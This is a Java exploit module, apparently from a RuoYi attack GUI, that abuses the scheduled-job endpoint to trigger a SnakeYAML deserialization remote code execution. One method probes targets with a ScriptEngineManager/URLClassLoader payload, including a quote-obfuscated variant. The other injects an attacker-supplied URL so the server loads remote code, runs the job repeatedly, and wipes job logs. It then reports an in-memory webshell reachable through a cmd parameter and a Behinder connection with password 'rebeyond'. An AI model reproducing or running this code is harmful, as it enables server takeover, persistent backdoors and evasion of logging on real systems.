package com.ruoyi.ruoyigui.exploit;

import com.ruoyi.ruoyigui.common.BasePayload;
import com.ruoyi.ruoyigui.entity.Result;
import com.ruoyi.ruoyigui.util.CustomHttpClient;

import java.util.Random;

public class ruoyi_job_snakeyaml_rce implements BasePayload {
    @Override
    public Result checkVUL(String url) throws Exception {
        Random random = new Random();
        int randomNumber = 100 + random.nextInt(201);
        String vul_uri = url + "/monitor/job/add";
        String payload = "createBy=admin&jobId=" + randomNumber + "&jobName=test111&jobGroup=DEFAULT&invokeTarget=org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1\"]]]]')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=";
        String payload1 = "createBy=admin&jobId=" + randomNumber + "&jobName=test111&jobGroup=DEFAULT&invokeTarget=org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"h't't'p://127.0.0.1\"]]]]')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=";
        String remove_vul_effect_uri = url + "/monitor/job/remove";
        String remove_vul_effect_payload = "ids=" + randomNumber;

        try {
            CustomHttpClient req = new CustomHttpClient();
            CustomHttpClient.HttpResponse res = req.post(vul_uri, payload);
            if (res.getBody().contains("操作成功")) {
                req.post(remove_vul_effect_uri, remove_vul_effect_payload);
                return new Result(true, "Ruoyi job snakeyaml rce漏洞", "[Snakeyaml漏洞]\nURI:" + vul_uri + "\nDATA:" + payload);
            } else {
                CustomHttpClient.HttpResponse res1 = req.post(vul_uri, payload1);
                if (res1.getBody().contains("操作成功")) {
                    req.post(remove_vul_effect_uri, remove_vul_effect_payload);
                    return new Result(true, "Ruoyi job snakeyaml rce漏洞", "[Snakeyaml漏洞]\nURI:" + vul_uri + "\nDATA:" + payload1);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new Result(false, "Ruoyi job snakeyaml rce漏洞", null);
    }

    @Override
    public Result exeVUL(String url, String cmd) throws Exception {
        Random random = new Random();
        int randomNumber = 100 + random.nextInt(201);
        String vul_uri = url + "/monitor/job/add";
        String payload = "createBy=admin&jobId=" + randomNumber + "&jobName=test111&jobGroup=DEFAULT&invokeTarget=org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager+%5B!!java.net.URLClassLoader+%5B%5B!!java.net.URL+%5B%22" + cmd + "%22%5D%5D%5D%5D')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=";
        String vul_url_run = url + "/monitor/job/run";
        String payload1 = "jobId=" + randomNumber;
        String remove_vul_effect_uri = url + "/monitor/jobLog/clean";

        try {
            CustomHttpClient req = new CustomHttpClient();
            String res = req.post(vul_uri, payload).getBody();
            if (res.contains("操作成功")) {
                req.post(vul_url_run, payload1);
                req.post(vul_url_run, payload1);
                req.post(vul_url_run, payload1);
                req.post(vul_url_run, payload1);
                String res1 = req.post(vul_url_run, payload1).getBody();
                if (res1.contains("操作成功")) {
                    req.post(remove_vul_effect_uri, "");
                    return new Result(true, null, "加载成功\n执行完稍等片刻\n直接执行命令：?cmd=whoami\n" +
                            "连接冰蝎：/login?cmd=1（cmd不为空即可），密码为rebeyond，使用冰蝎正常连接即可\n" +
                            "卸载内存马：?cmd=delete\n注入后记得删除计划任务");
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new Result(false, null, null);
    }

    @Override
    public Result getShell(String url) throws Exception {
        return new Result(false, null, null);
    }
}
